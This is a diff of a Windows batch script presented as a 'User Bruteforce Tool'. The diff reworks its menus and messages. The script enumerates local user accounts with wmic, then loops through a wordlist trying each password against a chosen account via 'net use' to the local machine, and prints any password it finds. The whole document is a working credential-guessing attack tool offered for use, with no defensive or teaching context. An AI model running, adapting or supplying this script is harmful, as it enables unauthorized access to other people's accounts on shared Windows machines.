@@ -1,89 +1,112 @@
 @echo off
-title userbruteforce - Ebola Man
+title L4Ta's User Bruteforce Tool ⚔
 setlocal enabledelayedexpansion
 chcp 65001 >nul
+
+::==========================
+:: Main Menu
+::==========================
 :start
 cls
-set error=-
-color F
-set user=""
-set wordlist=""
+color 0F
+set "error=-"
+set "user="
+set "wordlist="
+
 echo.
-echo      ___.                 __          _____                           
-echo      \_ ^|_________ __ ___/  ^|_  _____/ ____\___________   ____  ____  
-echo       ^| __ \_  __ \  ^|  \   __\/ __ \   __\/  _ \_  __ \_/ ___\/ __ \ 
-echo       ^| \_\ \  ^| \/  ^|  /^|  ^| \  ___/^|  ^| (  ^<_^> )  ^| \/\  \__\  ___/ 
-echo       ^|___  /__^|  ^|____/ ^|__^|  \___  ^>__^|  \____/^|__^|    \___  ^>___  ^>
-echo           \/                       \/                        \/    \/ 
+echo          ██╗     █████╗ ████████╗ █████╗     ██╗   ██╗███████╗
+echo          ██║    ██╔══██╗╚══██╔══╝██╔══██╗    ██║   ██║██╔════╝
+echo          ██║    ███████║   ██║   ███████║    ██║   ██║█████╗  
+echo          ██║    ██╔══██║   ██║   ██╔══██║    ╚██╗ ██╔╝██╔══╝  
+echo          ███████╗██║  ██║   ██║   ██║  ██║     ╚████╔╝ ███████╗
+echo          ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝      ╚═══╝  ╚══════╝
+echo.                    Made by: Ebola Man ⚙ - customized by: L4Ta
 echo.
-echo    ╔════════════════════╗
-echo    ║  COMMANDS:         ║
-echo    ║                    ║
-echo    ║  1. List Users     ║
-echo    ║  2. Bruteforce     ║
-echo    ║  3. Exit           ║
-echo    ╚════════════════════╝
-:input
-set /p "=>> " <nul
-choice /c 123 >nul
 
-if /I "%errorlevel%" EQU "1" (
-  echo.
-  echo.
-  wmic useraccount where "localaccount='true'" get name,sid,status
-  goto input
-)
+echo    ╔══════════════════════════════╗
+echo    ║       MENU OPTIONS           ║
+echo    ║                              ║
+echo    ║  1. List Local Users         ║
+echo    ║  2. Start Bruteforce         ║
+echo    ║  3. Exit                     ║
+echo    ╚══════════════════════════════╝
+echo.
 
-if /I "%errorlevel%" EQU "2" (
-  goto bruteforce
-)
+choice /c 123 /n /m "Select an option [1-3]: "
+if %errorlevel%==1 goto listusers
+if %errorlevel%==2 goto bruteforce
+if %errorlevel%==3 exit
 
-if /I "%errorlevel%" EQU "3" (
-  exit
-)
+::==========================
+:: List Users
+::==========================
+:listusers
+cls
+echo.
+echo [*] Local user accounts:
+echo.
+wmic useraccount where "localaccount='true'" get name,sid,status
+echo.
+pause
+goto start
 
+::==========================
+:: Bruteforce Logic
+::==========================
 :bruteforce
+cls
 set /a count=1
 echo.
+set /p "user=Enter target username: "
 echo.
-echo [TARGET USER]
-set /p user=">> "
-echo.
-echo [PASSWORD LIST]
-set /p wordlist=">> "
-if not exist "%wordlist%" echo. && echo [91m[%error%][0m [97mFile not found[0m && pause >nul && goto start
-net user %user% >nul 2>&1
-if /I "%errorlevel%" NEQ "0" (
+set /p "wordlist=Enter path to password list: "
+
+if not exist "%wordlist%" (
   echo.
-  echo [91m[%error%][0m [97mUser doesn't exist[0m
-  pause >nul
+  echo [!] Error: Password list not found!
+  pause
   goto start
 )
+
+net user %user% >nul 2>&1
+if %errorlevel% NEQ 0 (
+  echo.
+  echo [!] Error: User '%user%' does not exist.
+  pause
+  goto start
+)
+
 net use \\127.0.0.1 /d /y >nul 2>&1
 echo.
-for /f "tokens=*" %%a in (%wordlist%) do (
-  set pass=%%a
-  call :varset
+echo [*] Starting bruteforce...
+echo ---------------------------------------
+
+for /f "usebackq tokens=* delims=" %%a in ("%wordlist%") do (
+  set "pass=%%a"
+  call :trylogin
 )
+
 echo.
-echo [91m[%error%][0m [97mPassword not found[0m
-pause >nul
+echo [X] Password not found.
+pause
 goto start
 
+::==========================
+:: Attempt Login
+::==========================
+:trylogin
+net use \\127.0.0.1 /user:%user% "!pass!" >nul 2>&1
+echo [Attempt !count!] Trying: !pass!
+set /a count+=1
+net use | findstr /I "\\127.0.0.1" >nul && goto success
+exit /b
+
+::==========================
+:: Success Handler
+::==========================
 :success
 echo.
-echo [92m[+][0m [97mPassword found: %pass%[0m
+echo [+] Success! Password found: !pass!
 net use \\127.0.0.1 /d /y >nul 2>&1
-set user=
-set pass=
-echo.
-pause >nul
+pause
 goto start
-
-:varset
-net use \\127.0.0.1 /user:%user% %pass% 2>&1 | find "System error 1331" >nul
-echo [ATTEMPT %count%] [%pass%]
-set /a count=%count%+1
-if /I "%errorlevel%" EQU "0" goto success
-net use | find "\\127.0.0.1" >nul
-if /I "%errorlevel%" EQU "0" goto success 
